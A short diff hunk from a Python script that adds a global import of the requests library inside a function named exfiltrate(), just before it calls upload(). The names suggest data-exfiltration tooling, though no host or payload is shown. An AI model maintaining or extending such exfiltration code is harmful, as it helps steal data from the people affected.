@@ -63,6 +63,8 @@ def exfiltrate():
         install("requests")
     else:
         # otherwise use the requests library
+        global requests
+        requests = __import__("requests", globals(), locals()) # import requests at global level
         upload()
 
 def install(package):
